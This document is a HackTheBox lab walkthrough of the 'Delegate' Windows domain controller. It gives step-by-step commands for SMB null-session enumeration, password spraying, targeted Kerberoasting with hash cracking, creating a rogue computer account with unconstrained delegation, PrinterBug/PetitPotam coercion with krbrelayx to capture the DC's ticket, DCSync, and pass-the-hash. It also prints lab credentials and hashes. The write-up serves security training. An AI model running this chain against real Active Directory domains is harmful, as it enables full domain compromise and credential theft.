---
title: Delegate
categories: [HackTheBox]
tags: [printerbug,petitpotam,windows, ldap, kerberos, krbrelayx, smb, passwordcracking, acl, delegation]
media_subpath: /images/hackthebox_delegate/
image:
  path: 'https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/b134ff1405addccb96e50fb35d315dc9.png'
---

# HackTheBox Delegate - Complete Walkthrough

## Overview

Delegate is a Medium Windows machine that demonstrates Active Directory attack techniques including `GenericWrite` abuse and `Unconstrained  delegation` abuse leading to full domain compromise.

**Difficulty:** Medium  
**OS:** Windows  
**Key Techniques:** Kerberos delegation, PrinterBug, PetitPotam, KrbRelayX, Unconstrained delegation abuse

### Attacks Used in This Box

This machine demonstrates several critical Active Directory attack techniques:

- **Active Directory ACL Abuse** - Exploiting access control lists for privilege escalation ([Theory](/theory/windows/AD/acl/))
- **Unconstrained Delegation Abuse** - Configuring and exploiting unconstrained delegation ([Theory](/theory/windows/delegation/#unconstrained-delegation-kud))
- **PrinterBug Exploitation** - Forcing Domain Controller authentication via MS-RPRN ([Theory](/theory/windows/delegation/#unconstrained-delegation-attack-vectors))
- **KrbRelayX Ticket Capture** - Capturing and relaying Kerberos tickets ([Theory](/theory/windows/delegation/#unconstrained-delegation-practical-attack-example))
- **DCSync Attack** - Dump of all domain users hashes

---

## Initial Reconnaissance

### Port Scanning

Let's start by scanning the target machine to identify open services:

```bash
nmap -sC -sV -oA delegate 10.129.30.148
```

**Results:**

```bash
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-09-11 15:17:05Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

This is clearly a Windows Domain Controller running Active Directory services because of the presence of `LDAP`, `Kerberos`, and `SMB` services. The domain can be seem from the scrips that `nmap` ran on the host, `delegate.vl`.

### SMB Enumeration

For better enumeration, let's start enumerating `SMB` with the `nxc` tool:

```bash
nxc smb 10.129.30.148

SMB         10.129.30.148   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False) (Null Auth:True)
```
> From the output, can gathered the following information:
- **OS:** Windows Server 2022
- **SMB Signing:** Enabled
- **SMBv1:** Disabled
- **Null Authentication:** Allowed (we can connect without credentials)
- **Domain:** delegate.vl
- **Hostname:** DC1
{: .prompt-info}

Since null authentication is allowed, we can proceed with anonymous enumeration:

```bash
# Enumerate SMB shares
nxc smb 10.129.30.148 -u "guest" -p "" --shares
# Enumerate users via RID brute force
nxc smb 10.129.30.148 -u "guest" -p "" --rid-brute
```

![SMB enumeration results](file-20250911151817717.png)

From the enumeration, we can see that we have only access to the default DC domain shares: `NETLOGON` and `SYSVOL` and from the null-authentication we could brute-force RIDs to enumerate users.

#### RID Brute Force Attack

Let's enumerate all domain users using RID brute force and save them into a file called `users`:

```bash
nxc smb 10.129.30.148 -u "nonexistent" -p "" --rid-brute | grep SidTypeUser | awk '{print $(NF-1)}' | cut -d '\' -f2 | tee -a users
```

**Discovered Users:**
```bash
Administrator
Guest
krbtgt
DC1$
A.Briggs
b.Brown
R.Cooper
J.Roberts
N.Thompson
```

#### SYSVOL Share Access

We can access the SYSVOL share anonymously, which often contains Group Policy scripts and configuration files:

```bash
smbclient.py anon@10.129.30.148
```

Once connected, let's explore the SYSVOL directory:

```bash
# Navigate to SYSVOL
use SYSVOL

cd delegate.vl

cd scripts
ls
```

![SYSVOL directory listing](file-20250912124504438.png)

We discover a `users.bat` script that contains interesting information:

```bash
# Download and examine the script
get users.bat
cat users.bat
```

**Script Contents:**
```batch
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

**Key Finding:** The script reveals that user `A.Briggs` has access to a backup share using Administrator credentials with password `P4ssw0rd1#123`.

---

## User Enumeration and Credential Discovery

### Password Spray Attack

Now let's attempt to authenticate with the discovered password against all users:

```bash
nxc smb 10.129.30.148 -u users -p 'P4ssw0rd1#123' --continue-on-success
```

**Results:**
```bash
SMB         10.129.30.148   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123
```

**Success!** We've obtained valid credentials for user `A.Briggs:P4ssw0rd1#123`.

---

## Initial Access and Privilege Escalation

### LDAP Enumeration

With valid credentials, let's enumerate the domain for interesting objects and permissions using the `bloodyAD` tool:

```bash
bloodyAD --host 10.129.30.148 -u A.Briggs -p P4ssw0rd1#123 -d delegate.vl get writable
```
> From the output, we can see that `A.Briggs` has `GenericWrite` permissions on the user `N.Thompson`, which is a potential privilege escalation vector since we can write an arbitrary `SPN` into the `N.Thompson` account and them perform a `kerberoast` attack, (`targeted Kerberoasting` attack).
{: .prompt-info}

![LDAP enumeration results](file-20250912125834768.png)

### Kerberoasting Attack

Let's perform a targeted Kerberoasting attack to obtain service account hashes:

```bash
targetedKerberoast.py -d delegate.vl -u A.Briggs -p P4ssw0rd1#123
```

**Results:**
```bash
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$740023308c0e97cb5e75c02e0ea5d495$2fe417c25234e863790906fba1a8725d665d52a3d82bf87b5add3dbdb98a521ac0fcebfba7bc5b704716ac6b9579121a68a623a885f9c64e3164c0687dae6fab2de631132c87e8b9c23e7315bb99b73bb43d1db94d6714694f91a00637f05fe4d65775cdf06350c44587e47e33d5fd3a88680b4095d5a6f43424b9d6b14798cb57efe3c590919b17a31821e33d3df917f836c726a95e97855ba1e6dcf238bbf823d27cbabf35e6862e67e165bf7b51d802258ddab7090987ed3e847b5df90a59319f7dd03af16297c2ee885cf194a4c87c00a2bc9e2563a52b86597dfa6ecd58c341d4c3ef7883616e218667d59e09f72c84b4d826feba03177488dbf7217bf85fbf92bfc344a640e5fdb745b4acc094a5e271710e0bc1e3c5230f73ffe19cac9ab392a45f983ff329cc8a780ff49f3f9c105b00c78199191a31ece4fdd24d7c369c5408f9c316018a72b1d612399e0de352f77fd2674c23e2035702393f1ac90060819c12cc07e72ba6696881705e2d37cb1cbdc3c9b5e61c4f0de50b6c3e69806d6424d4505e0498695926fee48d254e03222dba050373df0fc86da30e1c3a40af0e0c6fd306164a09936929a55c4752a26f456c33eeeaffb5b1e63c8475efc72545656d0c8d3e114e30b09fe60796b190c0f4b04fb801d0971e153d1c894696b992689e32a3738af68f9bf5670d32a212a1b9ac7793cdae6275b8ed22f5658fc1837bf672a35f435e44c0873c67ce8e5de99e131452a46cf9502aec3d4aacb2b7c668e521e3a44f4693a7272347969a6746b09ba93b9b49fdb68c94c84f8c939da2920f006e6d70b51a33df2d5f1c6e43a41deb3b4654918b998348e0d437d2d4b12ca3d3bad116f51cf0634954e8d3c4c77a60e0864a066aa8038c137886b1331ee50fbde6760d67b3214f1b2fe0dac5d4ad8b2b95b5eb632f5c0e4e1f3df0979299e73a6c274b8da9a5caab5f08788eaeedcb3ea32253fc94bb6d369a1c2f36d9c9e1b6b88f729507c8011c61de427c288343f72de4b8a94d303abf369127e34f40d2a1869a96c08e6bc2336a1f6b2a9951282c76335a47a36133c947013bce4f0e53eca3d4a702658ebc342e1501e497ca829324f69412a167b9ccdf7bb3e9b6237931b0813389b3036133c9278c33cce6ccb6b5dc9639eedfdafd6a4ad628195b5163a3afd39df304c1ed78642bf90045990f1f2d1959217e32d5593d7fa2d7b31a266866e4f6140525f3033f330515bb82d176f02124b4db4335937bcfc3babb4128a88d43a1195b4b4d9b9200751b049cb821241ff0f8f5dcde222ad9ec153a4096708f03ade4ebf2e36e1f0d6ea518061dc7ee180da9b0e55971b59a78cb24a17c9fb1bef354b6b00976cd0c37ef70080256a0cf0ccdbd3c983a8f5be0cbfb04f28b1a80523d96ddcf60d86ec949cf65280f490c43162303215917b8cc7a36
```

We've obtained a Kerberos ticket for user `N.Thompson`. Let's crack this hash to obtain the password.

### Hash Cracking

Using hashcat to crack the Kerberos ticket:

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked Password:** `KALEB_2341`

### WinRM Access

User `N.Thompson` is member of the `Remote Management Users` group, which allows remote access via `WinRM`, now we can access the machine via `WinRM` using the cracked credentials:

```bash
evil-winrm -i 10.129.30.148 -u N.Thompson -p KALEB_2341
```

![NON](file-20250912155745625.png)

---

## Domain Controller Compromise

### Understanding Delegation Privileges

The key to this machine is understanding **Kerberos Delegation**. Let's check what delegation privileges are available:

```powershell
# Check delegation privileges
whoami /priv
```

![WinRM access established](file-20250911170048830.png)

We can see that `N.Thompson` has the `SeEnableDelegationPrivilege` privilege, which allows setting delegation properties on other accounts.

**Important Note:** Only an administrator or a privileged user with `SeEnableDelegationPrivilege` can set delegation options on other accounts. A service account cannot modify itself to add this option.

### Computer Account Creation

Let's create a new computer account that we can use for delegation attacks:

```bash
addcomputer.py -dc-ip 10.129.30.148 -computer-name evil$ -computer-pass P@$$word123! delegate.vl/N.Thompson:KALEB_2341
```

![Computer account creation](file-20250912141605412.png)

### Configuring Unconstrained Delegation

Now let's configure our newly created computer account for unconstrained delegation:

```bash
bloodyAD --host 10.129.30.148 -u N.Thompson -p KALEB_2341 -d delegate.vl add uac -f TRUSTED_FOR_DELEGATION evil$
```

**Result:**
```bash
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to evil$'s userAccountControl
```

![Delegation configuration verification](file-20250912141746945.png)

We can also add the `uac` and verify this using PowerShell:

```powershell
Set-ADAccountControl -Identity evil$ -TrustedForDelegation $true
Get-ADComputer -Identity evil$ -Properties TrustedForDelegation
```

![NON](file-20250912160052536.png)

#### Adding SPN and DNS

We also need to add an `SPN` and a `DNS` entry to our computer account:

```bash
uv run dnstool.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -r evil.delegate.vl -a add -t A -d 10.10.14.95 -dns-ip 10.129.30.148 DC1.delegate.vl

uv run addspn.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -s 'cifs/evil.delegate.vl' -t evil$ -dc-ip 10.129.30.148 DC1.delegate.vl --additional

uv run addspn.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -s 'cifs/evil.delegate.vl' -t evil$ -dc-ip 10.129.30.148 DC1.delegate.vl
```

![NON](file-20250912142415537.png)

### KrbRelayX Setup

Now we need to set up KrbRelayX to capture and relay Kerberos tickets. This tool will act as a Kerberos listener:

```bash
sudo uv run krbrelayx.py --krbsalt 'DELEGATEevil' --krbpass 'P@$$word123!' --interface-ip 10.10.14.95
```

### PrinterBug Exploitation (Or any coerce method)

With KrbRelayX running, we can now trigger the PrinterBug to force the Domain Controller to authenticate to our machine:

```bash
uv run printerbug.py delegate.vl/N.Thompson:KALEB_2341@dc1.delegate.vl evil.delegate.vl
```

**Alternative Method - PetitPotam:**
```bash
uv run PetitPotam.py -u evil$ -p 'P@$$word123!' -d delegate.vl -dc-ip 10.129.30.148 evil.delegate.vl 10.129.30.148
```

![PrinterBug exploitation](file-20250912143953527.png)

### Ticket Capture and Domain Controller Access

Once the PrinterBug is triggered, KrbRelayX will capture the Domain Controller's TGT (Ticket Granting Ticket):

![KrbRelayX ticket capture](file-20250911165240400.png)

We can now use this captured ticket to perform a `DCSync` attack:

```bash
# Set the Kerberos ticket
export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache

# Dump domain secrets
secretsdump.py -k -no-pass -just-dc-ntlm -just-dc-user Administrator 'DC1$@dc1.delegate.vl'

# Access the domain controller
nxc ldap 10.129.30.148 -u administrator -H c32198ceab4cc695e65045562aa3ee93
evil-winrm -i 10.129.30.148 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
```

![Domain controller compromise](file-20250912144854228.png)

---

## Understanding the Attack Chain

This attack demonstrates a sophisticated **Unconstrained Kerberos Delegation** exploitation:

1. **Initial Access:** We obtained credentials through SYSVOL script analysis and password spraying
2. **Privilege Escalation:** Used Kerberoasting to obtain higher-privileged user credentials
3. **Delegation Abuse:** Created a computer account and configured it for unconstrained delegation
4. **Ticket Capture:** Used PrinterBug/PetitPotam to force the DC to authenticate to our machine
5. **Domain Compromise:** Captured the DC's TGT and used it to gain full domain access

### Key Concepts

- **Unconstrained Delegation:** Allows a service to impersonate users to any service in the domain
- **PrinterBug:** Forces a machine to authenticate to an attacker-controlled machine
- **KrbRelayX:** Captures and relays Kerberos tickets for lateral movement
- **SeEnableDelegationPrivilege:** Required privilege to configure delegation on accounts

---

## Conclusion

The Delegate machine demonstrates several critical Active Directory security concepts:

1. **SYSVOL Exposure:** Group Policy scripts can contain sensitive credentials
2. **Kerberoasting:** Service account tickets can be cracked to obtain passwords
3. **Unconstrained Delegation:** Can be abused to capture high-privilege tickets
4. **PrinterBug/PetitPotam:** Can force authentication to attacker-controlled machines
5. **Delegation Privileges:** The `SeEnableDelegationPrivilege` is extremely powerful

**Key Takeaways:**
- Always review Group Policy scripts for hardcoded credentials
- Implement proper service account password policies
- Monitor for unconstrained delegation configurations
- Restrict delegation privileges to necessary accounts only
- Consider implementing Protected Users group for sensitive accounts

For more detailed information about Kerberos delegation attacks, see our [theory section on Kerberos Delegation](/theory/windows/delegation/).

